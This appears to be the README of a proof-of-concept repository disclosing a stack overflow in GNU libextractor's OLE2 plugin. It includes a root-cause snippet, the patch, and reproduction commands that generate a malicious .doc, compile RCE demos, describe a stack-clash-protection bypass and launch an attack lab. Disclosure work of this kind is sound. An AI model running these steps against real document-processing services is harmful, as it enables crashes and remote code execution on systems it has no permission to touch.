# Stack-Based Buffer Overflow in GNU libextractor ≤ 1.14 (OLE2 Plugin)

## Summary

A stack-based buffer overflow in GNU libextractor's OLE2 plugin allows **remote denial of service** (crash) and **code execution** when processing a crafted `.doc` file. The vulnerability is in `process_star_office()` (`ole2_extractor.c:349`) which allocates a Variable Length Array of up to 4MB on the stack based on attacker-controlled file data.

**Primary Impact:** Remote Denial of Service — crashes any application processing the malicious file  
**Secondary Impact:** Remote Code Execution via adjacent-thread-stack bypass of `-fstack-clash-protection`

| Field | Value |
|-------|-------|
| Severity | **HIGH** (DoS) / **CRITICAL** (RCE in multi-threaded in-process mode) |
| CWE | CWE-121 (Stack-based Buffer Overflow) |
| Attack Vector | Network (any file processing path) |
| Privileges Required | None |
| User Interaction | None |
| Affected Versions | All versions through 1.14 |

> **Note:** Modern GCC (≥8) enables `-fstack-clash-protection` by default, which on single-threaded applications converts the exploitable overflow into a safe crash. However, **this mitigation can be bypassed in multi-threaded applications** where thread stacks are adjacent in memory — the VLA probes succeed into the neighbor thread's stack, enabling full code execution even on hardened builds. See [docs/BYPASS.md](docs/BYPASS.md) for details.

## Affected Software

- GNU libextractor ≤ 1.14 (all versions with OLE2 plugin)
- Any application using libextractor to process untrusted `.doc` files
- GNUnet (file sharing indexer)

## Quick Demo

```bash
# Generate malicious .doc
python3 poc/gen_payload.py exploit.doc

# Any application that processes this file with libextractor crashes:
extract exploit.doc                    # CLI tool → OLE2 plugin worker crashes
gnunet-publish exploit.doc             # GNUnet → gnunet-helper-fs-publish crashes
```

## Proof of Concept (Lab Demo)

![Remote Code Execution Demo](screenshots/poc_demo.gif)

*The animation above demonstrates the automated lab environment provided in the `lab-setup/` directory. By simply running `docker compose up`, an attacker container automatically generates the malicious `.doc` payload and uploads it to a vulnerable Document Indexing web service. The `libextractor` parsing logic triggers the VLA stack overflow, allowing the attacker to silently achieve arbitrary code execution. We verify the exploit by running `cat /tmp/pwned` on the target container to see the command output.*

## Repository Structure

```
├── poc/                    # Proof of concept
│   ├── gen_payload.py      # Generates malicious .doc trigger file
│   ├── poc_rce.c           # Demonstrates code execution (protection disabled)
│   └── bypass_rce.c        # Stack-clash-protection bypass (multi-threaded)
├── exploit/                # Exploitation details
│   ├── remote_exploit.sh   # Example: triggering via HTTP upload (lab scenario)
│   └── extract_server.c    # Example: vulnerable application using libextractor
├── patches/                # Recommended fix
│   └── 0001-fix-ole2-vla.patch
├── lab-setup/              # Reproducible test environment
│   ├── Dockerfile          # Builds vulnerable libextractor from source
│   ├── docker-compose.yml  # Full lab (includes HTTP upload as one test vector)
│   └── upload_server.py    # Document indexing service simulation
└── docs/
    ├── BYPASS.md           # Stack-clash-protection bypass technique
    └── PAYLOAD_STRUCTURE.md # Malicious .doc file format documentation
```

## Reproduction

### Crash / DoS (works on any system)

```bash
# Build libextractor from source
./configure && make && sudo make install

# Generate trigger file
python3 poc/gen_payload.py exploit.doc

# Crash any libextractor consumer
extract exploit.doc   # crashes the OLE2 plugin worker
```

### Code Execution (protection disabled)

```bash
gcc -O2 -fno-stack-clash-protection -o poc_rce poc/poc_rce.c -lextractor
ulimit -s 2048
./poc_rce exploit.doc   # executes attacker payload (exit code 42)
```

### Code Execution (protection bypass, multi-threaded)

```bash
gcc -O2 -fstack-clash-protection -o bypass_rce poc/bypass_rce.c -lextractor -lpthread
./bypass_rce exploit.doc   # bypasses protection, executes payload (exit code 42)
```

### Docker lab

```bash
docker-compose -f lab-setup/docker-compose.yml up -d
```

## Root Cause

```c
// src/plugins/ole2_extractor.c:349
off_t size = gsf_input_size(src);        // Attacker controls via OLE2 stream
if (size > 4 * 1024 * 1024) return 0;   // Max 4MB allowed — but stack is 1-8MB
char buf[size];                           // VLA: up to 4MB ON THE STACK
gsf_input_read(src, size, buf);           // Write attacker data
```

Without `-fstack-clash-protection`, the compiler generates:
```asm
sub %rax, %rsp    ; Single instruction, jumps RSP past guard page
```

With `-fstack-clash-protection`, the probes can still be bypassed in multi-threaded contexts (see [docs/BYPASS.md](docs/BYPASS.md)).

## Official Patch (libextractor 1.15)

```diff
-  if ( (size < 0x374) ||
-       (size > 4 * 1024 * 1024) )
+  char buf[0x374];
+
+  if (size < 0x374)
     return 0;
-  {
-    char buf[size];
-    gsf_input_read (src, size, (unsigned char*) buf);
+  gsf_input_read (src, sizeof(buf), (unsigned char*) buf);
```

## Credit

Discovered by me (Haitam Lazaar) during my independent security research.

## License

My research is provided for educational and defensive purposes. Use responsibly.
